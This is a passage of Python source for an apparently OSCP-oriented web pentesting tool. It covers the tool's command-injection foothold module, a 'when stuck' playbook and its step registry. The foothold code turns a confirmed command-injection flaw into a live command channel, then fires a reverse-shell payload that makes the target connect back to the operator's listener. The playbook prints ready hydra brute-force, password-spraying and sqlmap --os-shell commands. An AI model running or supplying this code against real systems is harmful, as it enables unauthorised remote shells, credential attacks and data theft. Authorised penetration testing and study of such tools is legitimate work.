    cmdi-scan (`✗ CMDI /p?param  (echo-based, ; )` under a `[host]` section)."""
    out = []
    for sid, output in fetch_scripts(ip, port, proto):
        if sid == "cmdi-scan":
            host = ip
            for ln in (output or "").splitlines():
                mh = re.match(r"^\[([^\]\s]+)", ln)
                if mh:
                    host = mh.group(1)
                    continue
                m = re.match(r"\s*✗ CMDI (\S+?)\?(\S+?)\s+\((\w+)-based,\s*(.+?)\)\s*$", ln)
                if m:
                    out.append((host, m.group(1), m.group(2), m.group(3), m.group(4)))
    return out


def _foothold_lhost(target_ip: str) -> "str | None":
    """Our source IP toward the target (what the target must call back to)."""
    import socket
    try:
        u = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        u.connect((target_ip, 9))
        myip = u.getsockname()[0]
        u.close()
        return myip
    except Exception:                                         # noqa: BLE001
        return None


def _foothold_channel(ip: str, port: int, proto: str):
    """Rebuild a working command channel from a confirmed echo-based cmdi vector. Returns
    (run(cmd)->output, fire(cmd)->None, description) or None. `run` captures stdout between
    markers; `fire` launches a (backgrounded) command without waiting (for the reverse shell)."""
    import http.client
    import ssl
    import urllib.parse
    vecs = _parse_cmdi_vectors(ip, port, proto)
    if not vecs:
        return None
    name = (fetch_services(ip).get((port, proto)) or (None,))[0] or ""
    tls = port in (443, 8443) or "https" in name.lower() or "ssl" in name.lower()
    ctx = ssl._create_unverified_context()
    wrapmap = dict(_CMDI_WRAPS)
    dm = "pshFH"

    def _get(host, path, param, value):
        conn = None
        q = f"{path}?{param}={urllib.parse.quote(value, safe='')}"
        try:
            if tls:
                conn = http.client.HTTPSConnection(ip, port, timeout=12, context=ctx)
            else:
                conn = http.client.HTTPConnection(ip, port, timeout=12)
            conn.request("GET", q, headers={"Host": host, "User-Agent": "pshunter"})
            return conn.getresponse().read(200000).decode("utf-8", "replace")
        except Exception:                                     # noqa: BLE001
            return None
        finally:
            if conn is not None:
                try:
                    conn.close()
                except Exception:                             # noqa: BLE001
                    pass

    for host, path, param, kind, label in vecs:
        if kind != "echo":
            continue                                          # need reflected output to drive it
        wrap = wrapmap.get(label)
        if not wrap:
            continue

        def run(cmd, _h=host, _p=path, _pa=param, _w=wrap):
            body = _get(_h, _p, _pa, _w(f"echo {dm}$({cmd}){dm}"))
            if not body:
                return None
            m = re.search(re.escape(dm) + r"(.*?)" + re.escape(dm), body, re.S)
            return m.group(1) if m else None

        if (run("id") or "").find("uid=") >= 0:
            def fire(cmd, _h=host, _p=path, _pa=param, _w=wrap):
                threading.Thread(target=lambda: _get(_h, _p, _pa, _w(cmd + " &")),
                                 daemon=True).start()
            return run, fire, f"cmdi {host}{path}?{param} ({label})"
    return None


def _enumerate_shells(run) -> set:
    """Which interpreters exist on the target, probed live through the command channel."""
    cmd = ("for b in " + " ".join(_FOOTHOLD_ENUM_TOOLS) +
           "; do command -v $b >/dev/null 2>&1 && echo HAVE:$b; done")
    return set(re.findall(r"HAVE:(\S+)", run(cmd) or ""))


def _open_listener_terminal(script_path: str) -> "str | None":
    """Open the smart listener in a new terminal window/tab. Returns the emulator used, or None
    when headless (no display / no emulator) so the caller can fall back to inline instructions."""
    term = next(((shutil.which(x), flag) for x, flag in _TERM_EMULATORS if shutil.which(x)),
                (None, None))
    if not (os.environ.get("DISPLAY") or os.environ.get("WAYLAND_DISPLAY")) or not term[0]:
        return None
    binary, flag = term
    q = shlex.quote(script_path)
    inner = f"python3 {q}; rm -f {q}; exec ${{SHELL:-/bin/bash}}"
    try:
        subprocess.Popen([binary] + flag + ["sh", "-c", inner],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                         stdin=subprocess.DEVNULL, start_new_session=True)
        return binary
    except Exception:                                         # noqa: BLE001
        return None


def _tool_foothold(ip: str, port: int, proto: str) -> str:
    """HTTP step-26 tool (INTERACTIVE): spawn and auto-upgrade a reverse shell over a confirmed
    RCE channel. Rebuilds an echo-based cmdi vector from the DB, enumerates which interpreters
    live on the target, lets the operator pick a viable payload, opens a smart auto-upgrading
    listener in a new terminal, and fires the payload so the target connects back. Authorised
    targets only. Requires a cmdi vector (run cmdi-scan first) — otherwise prints manual payloads."""
    import time
    import tempfile

    lhost = _foothold_lhost(ip)
    channel = _foothold_channel(ip, port, proto)

    if not channel:
        print(f"\n{YELLOW}no confirmed command channel{RESET} — run {BOLD}cmdi-scan (r 19){RESET} "
              f"first, or paste a payload into a shell you already have.")
        lh = lhost or "<YOUR_IP>"
        print(f"{DIM}reverse shells (start {BOLD}nc -lvnp 4444{RESET}{DIM} on {lh}):{RESET}")
        for label, _need, tpl, _pty in _REVSHELLS[:4]:
            print(f"  {CYAN}{label:14}{RESET} {tpl.replace('{ip}', lh).replace('{port}', '4444')}")
        return "foothold: no command channel (cmdi-scan first) — manual payloads shown"

    run, fire, desc = channel
    ctx_id = (run("id") or "").strip()
    print(f"\n{GREEN}✓ command channel:{RESET} {desc}")
    if ctx_id:
        print(f"  {DIM}context:{RESET} {ctx_id}")
    if not lhost:
        print(f"{RED}✗ could not determine our IP toward {ip}{RESET}")
        return "foothold: no route to determine LHOST"

    avail = _enumerate_shells(run)
    print(f"  {DIM}on target:{RESET} {', '.join(sorted(avail)) or DIM + 'enumeration empty' + RESET}")
    viable = [rs for rs in _REVSHELLS if not avail or rs[1] in avail] or _REVSHELLS

    print(f"\n{BOLD}spawnable reverse shells{RESET} {DIM}(LHOST {lhost}){RESET}")
    for i, (label, need, _tpl, pty) in enumerate(viable, 1):
        tag = f"{GREEN}pty{RESET}" if pty else f"{DIM}dumb→auto-upgrade{RESET}"
        print(f"  {CYAN}{i:>2}{RESET} {label:14} {DIM}({need}){RESET}  {tag}")
    try:
        raw = input(f"{BOLD}pick a shell #{RESET} (or 'q'): ").strip()
    except (EOFError, KeyboardInterrupt):
        return "foothold: aborted"
    if not raw or raw.lower() == "q":
        return "foothold: aborted (no shell chosen)"
    if not raw.isdigit() or not 1 <= int(raw) <= len(viable):
        return "foothold: invalid choice"
    label, _need, tpl, pty = viable[int(raw) - 1]
    try:
        pin = input(f"{BOLD}LPORT{RESET} [4444]: ").strip()
    except (EOFError, KeyboardInterrupt):
        return "foothold: aborted"
    lport = int(pin) if pin.isdigit() and 1 <= int(pin) <= 65535 else 4444

    payload = tpl.replace("{ip}", lhost).replace("{port}", str(lport))
    upgrade = b"" if pty else _FOOTHOLD_UPGRADE.encode()
    src = (_SMART_LISTENER_SRC.replace("__LPORT__", str(lport))
           .replace("__UPGRADE__", repr(upgrade)))
    fd, spath = tempfile.mkstemp(prefix="pshunter_listener_", suffix=".py")
    with os.fdopen(fd, "w") as fh:
        fh.write(src)

    used = _open_listener_terminal(spath)
    if not used:
        _safe_unlink(spath)
        print(f"\n{YELLOW}headless — no terminal to open.{RESET} Run this listener yourself:")
        print(f"  {BOLD}nc -lvnp {lport}{RESET}   {DIM}(on {lhost}){RESET}")
        print(f"then this fires the shell. payload:\n  {DIM}{payload}{RESET}")
        return f"foothold: headless — listener not opened; payload for {label} shown"

    print(f"\n{GREEN}▶ listener opened in a new terminal{RESET} {DIM}({used}) on {lhost}:{lport}{RESET}")
    print(f"  {DIM}firing {label} through {desc}…{RESET}")
    time.sleep(1.5)                                           # let the listener bind first
    fire(payload)
    print(f"  {DIM}→ check the new terminal for your{RESET} "
          f"{GREEN}{'pty' if pty else 'auto-upgraded'} shell{RESET}"
          f"{DIM}; if nothing lands, egress may be firewalled.{RESET}")
    return (f"foothold: fired {label} reverse shell → {lhost}:{lport} "
            f"(via {desc}); listener in a new terminal")


# ── HTTP step 27: manual next steps — a context-aware "when stuck" playbook (list only) ──
def _tool_next_steps(ip: str, port: int, proto: str) -> str:
    """HTTP step-27 tool: NOT a scan — a read-only checklist of manual escalations for when the
    automated steps came up short, with this host's own findings substituted in (versions →
    CVE-research links, discovered vhosts/params/users → ready commands, and our own unconfirmed
    ⚠ hits listed for manual verification). Pure DB synthesis; no network traffic."""
    import urllib.parse

    services = fetch_services(ip)
    svc = services.get((port, proto)) or (None, None, None, None)
    name = svc[0] or ""
    tls = port in (443, 8443) or "https" in name.lower() or "ssl" in name.lower()
    scheme = "https" if tls else "http"
    base = f"{scheme}://{ip}:{port}/"
    vhosts = sorted({hn for hn, _p, _s in fetch_hostnames(ip) if hn and hn != ip})

    scripts = fetch_scripts(ip, port, proto)
    by_sid = {}
    for sid, out in scripts:
        by_sid.setdefault(sid, out or "")

    # versions (services + whatweb Product[ver] + Server/X-Powered-By headers)
    versions = []
    for (_nm, prod, ver, _cpe) in services.values():
        if prod and ver:
            versions.append(f"{prod} {ver}")
    for m in re.finditer(r"([A-Za-z][\w .\-]*?)\[([\d][\w.\-]*)\]", by_sid.get("http-fingerprint", "")):
        versions.append(f"{m.group(1).strip()} {m.group(2)}")
    for h in ("Server", "X-Powered-By"):
        m = re.search(rf"^{h}:\s*(.+)$", by_sid.get("http-headers", ""), re.I | re.M)
        if m:                                                 # "Apache/2.4.51" → "Apache 2.4.51"
            versions.append(m.group(1).strip().split()[0].replace("/", " "))
    versions = [v for v in dict.fromkeys(versions) if re.search(r"\d", v)][:10]

    cms = (re.search(r"^CMS: (\S+)", by_sid.get("cms-scan", ""), re.M) or [None, None])[1] \
        if "CMS:" in by_sid.get("cms-scan", "") else None
    mu = re.search(r"⚠ CMS-USERS (.+)", by_sid.get("cms-scan", ""))
    users = [u.strip() for u in mu.group(1).split(",")] if mu else []

    params = re.findall(r"^\s*(/\S*)\?\[([^\]]+)\]", by_sid.get("param-hunt", ""), re.M)
    eps = list(dict.fromkeys(re.findall(r"^\s*\+ \d{3}\s+(\S+)", by_sid.get("dir-brute", ""), re.M)))[:8]

    warns = []
    for sid, out in scripts:
        for ln in (out or "").splitlines():
            s = ln.strip()
            if s.startswith("⚠") and "CMS-USERS" not in s:
                warns.append(f"{DIM}[{sid}]{RESET} {s}")
    warns = warns[:14]

    def q(s):
        return urllib.parse.quote(s)

    L = [f"{base} — manual next steps {DIM}(list only; nothing is scanned here){RESET}",
         f"{DIM}targets: {base}" + (f"  ·  vhosts: {', '.join(vhosts)}" if vhosts else "") + RESET]

    L.append(f"\n{BOLD}A. Deeper enumeration (bigger lists / longer / recursive){RESET}")
    L.append(f"  {DIM}feroxbuster -u {base} -w /usr/share/seclists/Discovery/Web-Content/"
             f"directory-list-2.3-big.txt -x php,txt,bak,zip -r{RESET}")
    L.append(f"  {DIM}ffuf -u {base}FUZZ -w /usr/share/seclists/Discovery/Web-Content/"
             f"raft-large-words.txt -e .php,.bak,.old{RESET}")
    if vhosts or True:
        L.append(f"  {DIM}vhost: ffuf -u {base} -H 'Host: FUZZ.<domain>' -w "
                 f"/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fs <baseline>{RESET}")
    L.append(f"  {DIM}subdomains (if you know the domain): subfinder -d <domain> ; amass enum -d <domain>{RESET}")
    L.append(f"  {DIM}params: arjun -u {base}<endpoint> -w big.txt  ·  x8  ·  Burp Param Miner{RESET}")
    L.append(f"  {DIM}api: check /openapi.json /swagger  ·  GraphQL introspection on /graphql{RESET}")

    L.append(f"\n{BOLD}B. Interactive / heavier tools{RESET}")
    L.append(f"  {DIM}Burp: proxy + spider + active scan; Intruder/Turbo Intruder on the params below; "
             f"Collaborator for blind OOB (XXE/SSRF/SSTI){RESET}")
    tag = cms.lower() if cms else "<tech>"
    L.append(f"  {DIM}nuclei -u {base} -tags {tag},cve,exposure  ·  nuclei -u {base} -as (auto tech){RESET}")
    L.append(f"  {DIM}wafw00f {base}  (if requests get blocked → --delay / proxychains / rotate IP){RESET}")

    L.append(f"\n{BOLD}C. CVE research on the versions we found{RESET}")
    if versions:
        for v in versions:
            L.append(f"  {CYAN}{v}{RESET}")
            L.append(f"      {DIM}searchsploit {v}  ·  https://www.exploit-db.com/search?q={q(v)}{RESET}")
            L.append(f"      {DIM}https://nvd.nist.gov/vuln/search/results?query={q(v)}  ·  "
                     f"https://vulners.com/search?query={q(v)}{RESET}")
    else:
        L.append(f"  {DIM}no versioned products captured — re-run fingerprint (r2) / headers (r1) first{RESET}")

    L.append(f"\n{BOLD}D. Auth / credentials (beyond our small default set){RESET}")
    if users:
        L.append(f"  {CYAN}users found:{RESET} {', '.join(users)}")
        L.append(f"  {DIM}spray: hydra -L users.txt -p '<Season2024!>' {ip} http-post-form ...  (mind lockout){RESET}")
    L.append(f"  {DIM}full brute on the real login form: hydra -l <user> -P "
             f"/usr/share/wordlists/rockyou.txt {ip} -s {port} http[s]-post-form "
             f"'/login:user=^USER^&pass=^PASS^:F=incorrect'{RESET}")
    L.append(f"  {DIM}reuse any looted creds across the host's other services (SSH/SMB/DB/RDP){RESET}")

    L.append(f"\n{BOLD}E. Injection deep-dive (manual){RESET}")
    if params:
        L.append(f"  {CYAN}params to target:{RESET} " +
                 "; ".join(f"{p}?[{pp}]" for p, pp in params[:6]))
    if eps:
        L.append(f"  {CYAN}endpoints:{RESET} {', '.join(eps)}")
    L.append(f"  {DIM}sqlmap -u '{base}<endpoint>?id=1' --level 5 --risk 3 --tamper=space2comment "
             f"--batch --dbs  (then --os-shell){RESET}")
    L.append(f"  {DIM}LFI wrapper chains / deeper traversal (ffuf)  ·  SSTI engine-specific gadgets{RESET}")
    L.append(f"  {DIM}deserialization if you see __VIEWSTATE / PHP-serialized / Java blobs → ysoserial{RESET}")
    L.append(f"  {DIM}HTTP request smuggling / desync → Burp (we don't test this){RESET}")

    L.append(f"\n{BOLD}F. Classes we do NOT cover — check by hand{RESET}")
    L.append(f"  {DIM}XSS (reflected/stored/DOM) · CSRF · business logic · race conditions · "
             f"OAuth/SAML/JWT deep · CORS misconfig{RESET}")

    L.append(f"\n{BOLD}G. Verify our own UNCONFIRMED hits (highest value){RESET}")
    if warns:
        for w in warns:
            L.append(f"  {w}")
    else:
        L.append(f"  {DIM}none flagged — nothing sat on the fence{RESET}")

    L.append(f"\n{BOLD}H. Housekeeping / re-run{RESET}")
    if vhosts:
        L.append(f"  {DIM}add vhosts to /etc/hosts, then re-run dir-brute (r9) per vhost: "
                 f"{ip} {' '.join(vhosts)}{RESET}")
    L.append(f"  {DIM}raise time budgets and re-run the long steps (vhost r8 / dir-brute r9 / param r11){RESET}")
    L.append(f"  {DIM}enumerate the host's OTHER ports/services (own checklists) — the web app may not be the way in{RESET}")
    return "\n".join(L)


# tool key -> (short label shown in the checklist, runner(ip, port, proto) -> output str)
_STEP_TOOLS = {
    "http-headers": ("HTTP headers (stdlib, no redirects)", _tool_http_headers),
    "http-fingerprint": ("whatweb (stack fingerprint)", _tool_http_fingerprint),
    "ssl-cert": ("openssl (TLS cert → hostnames/emails)", _tool_tls_cert),
    "searchsploit": ("searchsploit (Exploit-DB by version)", _tool_searchsploit),
    "http-source": ("view-source + JS mining (endpoints/secrets)", _tool_http_source),
    "http-wellknown": ("robots/sitemap/.well-known + error page", _tool_http_wellknown),
    "http-cookies": ("cookie flags + JWT (alg:none / weak secret)", _tool_http_cookies),
    "vhost-fuzz": ("vhost sweep (stdlib) → hidden apps on this IP", _tool_vhost_fuzz),
    "dir-brute": ("content sweep (stdlib) → dirs/files per host+vhost", _tool_dir_brute),
    "vcs-hunt": ("VCS/backup/config hunt (stdlib, signature-checked)", _tool_vcs_hunt),
    "param-hunt": ("hidden param discovery (stdlib) → dynamic endpoints", _tool_param_hunt),
    "default-creds": ("default creds check (stdlib) → Basic + login forms", _tool_default_creds),
    "auth-bypass": ("auth bypass (SQLi) + user enumeration (stdlib)", _tool_auth_bypass),
    "login-brute": ("targeted login brute (stdlib, gated) → Basic + forms", _tool_login_brute),
    "sqli-scan": ("SQLi scan (stdlib: error/boolean/time) + sqlmap enum/dump", _tool_sqli_scan),
    "sqli-dump": ("SQLi auto-dump (OSCP-safe, no sqlmap) → UNION/error/blind", _tool_sqli_dump),
    "lfi-scan": ("LFI / path traversal (stdlib, content-verified) → php://filter, /proc", _tool_lfi_scan),
    "rfi-scan": ("RFI / wrapper inclusion (stdlib) → data://, php://input", _tool_rfi_scan),
    "cmdi-scan": ("OS command injection (stdlib: echo/time) → id/uname, RCE cmd", _tool_cmdi_scan),
    "ssti-scan": ("SSTI (stdlib, math-verified) → engine + auto-id RCE + cmd", _tool_ssti_scan),
    "upload-shell": ("file-upload webshell (stdlib, PHP/ASP/JSP auto, exec-verified)", _tool_file_upload),
    "xxe-ssrf": ("XXE & SSRF (stdlib, read-only) → metadata + file-read + OOB", _tool_xxe_ssrf),
    "idor-bac": ("IDOR / broken access control (stdlib, read-only, creds-aware)", _tool_idor_bac),
    "cms-scan": ("CMS scan → wpscan/droopescan + stdlib fallback (plugins/themes/users)", _tool_cms_scan),
    "admin-rce": ("admin panel → RCE (WordPress, creds-gated, inert, reversible)", _tool_admin_rce),
    "foothold": ("foothold → spawn & auto-upgrade a reverse shell (interactive)", _tool_foothold),
    "next-steps": ("manual next steps — context-aware 'when stuck' list (no scan)", _tool_next_steps),
}

def _mins(seconds: int) -> str:
    """Compact minute count for a step-tool time cap: '10', '2.5' (caller adds the unit)."""
    m = seconds / 60
    return str(int(m)) if seconds % 60 == 0 else f"{m:.1f}"


# What runs behind each wired step, shown compactly under the checklist line. Verified against
# every _tool_* source: the ONLY external Kali binaries invoked are whatweb / openssl /
# searchsploit (each IS the step) and sqlmap (driven by sqli-scan, only if installed). Every
# other engine is pure stdlib — no john/hashcat/hydra/nmap/ffuf/gobuster/wpscan/etc. (arjun is
# reused only as a wordlist file, not run). Per key: (engine label, time-cap text | None).
_STEP_TOOL_RUNS = {
    "http-headers":     ("Python", None),
    "http-fingerprint": ("whatweb", None),
    "ssl-cert":         ("openssl", None),
    "searchsploit":     ("searchsploit", None),
    "http-source":      ("Python", None),
    "http-wellknown":   ("Python", None),
    "http-cookies":     ("Python", None),
    "vhost-fuzz":       ("Python", f"{_mins(_VHOST_DEADLINE)} min"),
    "dir-brute":        ("Python", f"{_mins(_DIRB_DEADLINE)} min"),
    "vcs-hunt":         ("Python", f"{_mins(_VCS_DEADLINE)} min"),
    "param-hunt":       ("Python", f"{_mins(_PARAM_DEADLINE)} min"),
    "default-creds":    ("Python", f"{_mins(_CREDS_DEADLINE)} min"),
    "auth-bypass":      ("Python", f"{_mins(_AUTHB_DEADLINE)} min"),
    "login-brute":      ("Python", f"{_mins(_BRUTE_DEADLINE)} min"),
    "sqli-dump":        ("Python", f"{_mins(_SQLI_DUMP_DEADLINE)} min"),
    # stdlib detection (5 min) then sqlmap enum/dump if installed (3 min/point) → "5/3 min"
    "sqli-scan":        ("Python/sqlmap",
                         f"{_mins(_SQLI_DEADLINE)}/{_mins(_SQLI_SQLMAP_TIMEOUT)} min"),
    "lfi-scan":         ("Python", f"{_mins(_LFI_DEADLINE)} min"),
    "rfi-scan":         ("Python", f"{_mins(_RFI_DEADLINE)} min"),
    "cmdi-scan":        ("Python", f"{_mins(_CMDI_DEADLINE)} min"),
    "ssti-scan":        ("Python", f"{_mins(_SSTI_DEADLINE)} min"),
    "upload-shell":     ("Python", f"{_mins(_UPLOAD_DEADLINE)} min"),
    "xxe-ssrf":         ("Python", f"{_mins(_XXES_DEADLINE)} min"),
    "idor-bac":         ("Python", f"{_mins(_IDOR_DEADLINE)} min"),
    "cms-scan":         ("Python + wpscan/droopescan", f"{_mins(_CMS_DEADLINE)} min"),
    "admin-rce":        ("Python", f"{_mins(_ADMINRCE_DEADLINE)} min"),
    "foothold":         ("Python", None),
    "next-steps":       ("list only — no scan", None),
}


def _step_run_line(tool_key: str) -> str:
    """Compact '→ …' descriptor under a wired step: the tool/engine and its time cap."""
    info = _STEP_TOOL_RUNS.get(tool_key)
    if not info:
        return "internal program"
    label, cap = info
    return f"{label}  ·  time {cap}" if cap else label


# tools that harvest hostnames → maintain the managed /etc/hosts block (root) / show the
# paste line (no root); used to print the right sudo notice at launch
_HOSTS_WRITING_TOOLS = {"http-headers", "ssl-cert", "http-source", "vhost-fuzz"}

# status glyph + colour for a checklist step
_STEP_MARK = {"done": ("✓", GREEN), "skip": ("⊘", MAGENTA), "running": ("⏳", YELLOW),
              None: ("○", DIM)}


def _render_exploit_checklist(ip: str, target: tuple) -> None:
    """One service's pentest checklist: each step with its status (○ to-do / ✓ done /
    ⊘ skip) and, when one is wired, the tool that can run it."""
    port, proto, label, key, ver, signal = target
    _sync_hosts_block(ip)     # entering a host's checklist as root materialises its DB domains → hosts
    steps = _EXPLOIT_STEPS.get(key) or _EXPLOIT_STEPS["other"]
    status = fetch_step_status(ip, port, proto, key)
    print(f"\n{BOLD}{label} — checklist{RESET}  {DIM}{ip}:{port}/{proto}{RESET}")
    if ver:
        print(f"  {DIM}fingerprint:{RESET} {ver} {DIM}(via {signal}){RESET}")
    print()
    for i, step in enumerate(steps, 1):
        desc, tool_key = _step_parts(step)
        st = status.get(i)
        sym, col = _STEP_MARK.get(st, _STEP_MARK[None])
        has_tool = bool(tool_key and tool_key in _STEP_TOOLS)
        text = f"{BOLD}{desc}{RESET}" if has_tool else desc   # wired (runnable) → bold
        body = f"{col}{text}{RESET}" if st in ("done", "skip") else text  # done → green line
        print(f"  {CYAN}{i:>2}{RESET} {col}{sym}{RESET} {body}")
        if has_tool:
            print(f"        {DIM}→ {_step_run_line(tool_key)}  ·  run with {BOLD}r {i}{RESET}")


def _step_tool_worker(job: dict, ip: str, port: int, proto: str, tool_key, runner,
                      svc_key: str, step_n: int, prev_status: "str | None") -> None:
    """Background body of a checklist tool: run it, store the output as the port's DETAILS
    (which also extracts hostnames/findings), update the job, and flip the checklist step
    to ✓ done on success — or back to its prior status on error."""
    try:
        out = runner(ip, port, proto)
    except Exception as exc:                              # noqa: BLE001 — never crash the thread
        job["state"], job["error"] = "error", str(exc)
        _job_update(job)
        set_step_status(ip, port, proto, svc_key, step_n, prev_status)   # error → leave as it was
        return
    save_scripts(ip, [{"id": tool_key, "port": port, "proto": proto, "output": out}])
    job["state"], job["output"], job["hosts"] = "done", out, 1
    _job_update(job)
    set_step_status(ip, port, proto, svc_key, step_n, "done")            # success → green


def _run_step_tool(ip: str, target: tuple, n: int) -> None:
    """Launch the wired tool for step n in the background (like the scan phases, so the app
    never blocks); marks the step ⏳ running now, ✓ done when it finishes. Output lands in
    the port's DETAILS / [f] findings, viewable in status."""
    port, proto, _label, key, _ver, _signal = target
    _sync_hosts_block(ip)     # running any checklist tool materialises this host's DB domains → hosts (root)
    steps = _EXPLOIT_STEPS.get(key) or _EXPLOIT_STEPS["other"]
    if not 1 <= n <= len(steps):
        print(f"{RED}✗ no step {n}{RESET}")
        return
    _desc, tool_key = _step_parts(steps[n - 1])
    if not tool_key or tool_key not in _STEP_TOOLS:
        print(f"{DIM}step {n} has no tool — do it manually{RESET}")
        return
    tlabel, runner = _STEP_TOOLS[tool_key]

    if tool_key in ("foothold", "next-steps"):                # foreground: interactive / print-now
        prev = fetch_step_status(ip, port, proto, key).get(n)
        set_step_status(ip, port, proto, key, n, "running")
        try:
            out = runner(ip, port, proto)                     # foothold reads input; next-steps builds a list
        except Exception as exc:                              # noqa: BLE001
            print(f"{RED}✗ {tool_key} error: {exc}{RESET}")
            set_step_status(ip, port, proto, key, n, prev)
            return
        if tool_key == "next-steps":                          # it's a list to read now, not a scan result
            print("\n" + out)
            out = re.sub(r"\x1b\[[0-9;]*m", "", out)           # store clean text (no ANSI) in DETAILS
        save_scripts(ip, [{"id": tool_key, "port": port, "proto": proto, "output": out}])
        set_step_status(ip, port, proto, key, n, "done")
        return

    prev = fetch_step_status(ip, port, proto, key).get(n)     # so an error can restore it
    set_step_status(ip, port, proto, key, n, "running")       # show ⏳ in the checklist now
    job = _new_job("5", f"{_label} ({ip}:{port}/{proto})", f"{tlabel} on {ip}:{port}/{proto}")
    threading.Thread(target=_step_tool_worker,
                     args=(job, ip, port, proto, tool_key, runner, key, n, prev),
                     daemon=True).start()
    print(f"\n{GREEN}▶ {tlabel} running in the background{RESET} "
          f"{DIM}({ip}:{port}/{proto}) — check {BOLD}[s] status{RESET}{DIM}; output → "
          f"{BOLD}DETAILS{RESET}{DIM} / {BOLD}[f] findings{RESET}")
    if tool_key == "vhost-fuzz":                  # tell the user which wordlist was chosen
        wl_label, words = _pick_vhost_wordlist()
        print(f"{DIM}   wordlist: {BOLD}{wl_label}{RESET}{DIM} ({len(words)} words) · "
              f"deadline {_VHOST_DEADLINE // 60} min{RESET}")
    if tool_key == "dir-brute":                   # wordlist + how many targets (host + vhosts)
        wl_label, words = _pick_dirb_wordlist()
        nv = len({hn for hn, _p, _s in fetch_hostnames(ip) if hn != ip})
        print(f"{DIM}   wordlist: {BOLD}{wl_label}{RESET}{DIM} ({len(words)} words) · "
              f"targets: host + {nv} vhost(s) · deadline {_DIRB_DEADLINE // 60} min{RESET}")
    if tool_key == "vcs-hunt":                    # signature-checked exposures, host + vhosts
        nv = len({hn for hn, _p, _s in fetch_hostnames(ip) if hn != ip})
        print(f"{DIM}   signature-checked exposures · targets: host + {nv} vhost(s) · "
              f"deadline {_VCS_DEADLINE // 60} min{RESET}")
    if tool_key == "param-hunt":                  # wordlist + endpoints mined from earlier steps
        wl_label, words = _pick_param_wordlist()
        ne = len(_gather_param_endpoints(ip, port, proto))
        print(f"{DIM}   wordlist: {BOLD}{wl_label}{RESET}{DIM} ({len(words)} params) · "
              f"endpoints: {ne} · deadline {_PARAM_DEADLINE // 60} min{RESET}")
    if tool_key == "default-creds":               # small default set, not brute — warn on lockout
        print(f"{DIM}   default creds only (not brute-force) · {RESET}{YELLOW}⚠ may trigger "
              f"account lockout{RESET}{DIM} · deadline {_CREDS_DEADLINE // 60} min{RESET}")
    if tool_key == "auth-bypass":                 # non-destructive SQLi + enum on login forms
        print(f"{DIM}   non-destructive SQLi bypass + user enumeration on login forms · "
              f"{RESET}{YELLOW}⚠ active — authorized targets only{RESET}{DIM} · "
              f"deadline {_AUTHB_DEADLINE // 60} min{RESET}")
    if tool_key == "login-brute":                 # gated brute — loud warning
        print(f"{YELLOW}   ⚠ active brute-force{RESET}{DIM} — gates: enum user-list + lockout probe · "
              f"capped {_BRUTE_MAX_PASS} pw · {RESET}{YELLOW}authorized targets only, may lock "
              f"accounts{RESET}{DIM} · deadline {_BRUTE_DEADLINE // 60} min{RESET}")
    if tool_key == "sqli-scan":                   # stdlib detect + auto sqlmap enum/bounded-dump
        sm = "sqlmap ✓" if shutil.which("sqlmap") else "sqlmap NOT installed"
        print(f"{YELLOW}   ⚠ active injection tests{RESET}{DIM} — stdlib detect → {sm} enum + "
              f"bounded dump (os-shell/file-read stay manual) · {RESET}{YELLOW}authorized "
              f"targets only{RESET}{DIM}{RESET}")
    if tool_key == "sqli-dump":                   # own engine, no external tool (OSCP-safe)
        print(f"{YELLOW}   ⚠ active SQLi extraction{RESET}{DIM} — own stdlib engine, "
              f"NO sqlmap (OSCP-safe) · UNION/error auto-dump, blind for short values · "
              f"{RESET}{YELLOW}authorized targets only{RESET}{DIM}{RESET}")
    if tool_key == "lfi-scan":                    # read-only file-read tests, content-verified
        print(f"{YELLOW}   ⚠ active file-read tests{RESET}{DIM} — read-only, content-verified "
              f"(passwd/win.ini/environ/php-filter) · RCE stays manual · "
              f"{RESET}{YELLOW}authorized targets only{RESET}{DIM}{RESET}")
    if tool_key == "rfi-scan":                    # marker-verified wrapper inclusion, no auto-RCE
        print(f"{YELLOW}   ⚠ active inclusion tests{RESET}{DIM} — marker echo only (data://, "
              f"php://input, expect://) · remote webshell stays manual · "
              f"{RESET}{YELLOW}authorized targets only{RESET}{DIM}{RESET}")
    if tool_key == "cmdi-scan":                   # computed-marker + time; auto id/uname only
        print(f"{YELLOW}   ⚠ active command-injection tests{RESET}{DIM} — computed marker + time; "
              f"auto-runs read-only id/uname · reverse shell stays manual · "
              f"{RESET}{YELLOW}authorized targets only{RESET}{DIM}{RESET}")
    if tool_key == "ssti-scan":                   # math-verified; auto-id via engine gadget
        print(f"{YELLOW}   ⚠ active template-injection tests{RESET}{DIM} — computed math marker; "
              f"auto-runs read-only id via engine gadget (confirms RCE) · "
              f"{RESET}{YELLOW}authorized targets only{RESET}{DIM}{RESET}")
    if tool_key in _HOSTS_WRITING_TOOLS:          # domain-discovery tools: /etc/hosts status
        if _is_root():
            print(f"{DIM}   sudo ✓ — discovered domains are auto-added to "
                  f"{BOLD}/etc/hosts{RESET}{DIM} (removed on exit){RESET}")
        else:
            print(f"{YELLOW}   ⚠ no sudo — discovered domains will NOT be written to "
                  f"/etc/hosts{RESET}{DIM}; re-run under sudo, or use the paste line in "
                  f"{BOLD}[f] findings{RESET}")


def _exploit_service_view(ip: str, target: tuple) -> None:
    """One service's checklist: <n> toggles done, s <n> toggles skip, r <n> runs the
    step's tool. Status is saved so progress survives across sessions."""
    port, proto, _label, key = target[0], target[1], target[2], target[3]
    steps = _EXPLOIT_STEPS.get(key) or _EXPLOIT_STEPS["other"]

    def _toggle(n, want):
        if not 1 <= n <= len(steps):
            print(f"{RED}✗ no step {n}{RESET}")
            return
        cur = fetch_step_status(ip, port, proto, key).get(n)
        set_step_status(ip, port, proto, key, n, None if cur == want else want)

    def _handle(_c, v):
        if v == "":
            return "refresh"
        if v == "s":                             # bare s → running jobs / tool status
            _status_view()
            return "refresh"
        if v == "f":                             # f → findings harvested from the tools
            _host_findings_view(ip)
            return "refresh"
        if v.startswith("s") and v[1:].strip().isdigit():
            _toggle(int(v[1:].strip()), "skip")
            return "refresh"
        if v.startswith("r") and v[1:].strip().isdigit():
            _run_step_tool(ip, target, int(v[1:].strip()))
            return "stay"                        # just the launch line + bare prompt (no redraw)
        if v.isdigit():
            _toggle(int(v), "done")
            return "refresh"
        print(f"{RED}✗ unknown option{RESET} "
              f"{DIM}— <n> done · s <n> skip · r <n> run · s · f · b{RESET}")
        return "stay"

    _run_view(f"{ip}:{port}/{proto} exploit",
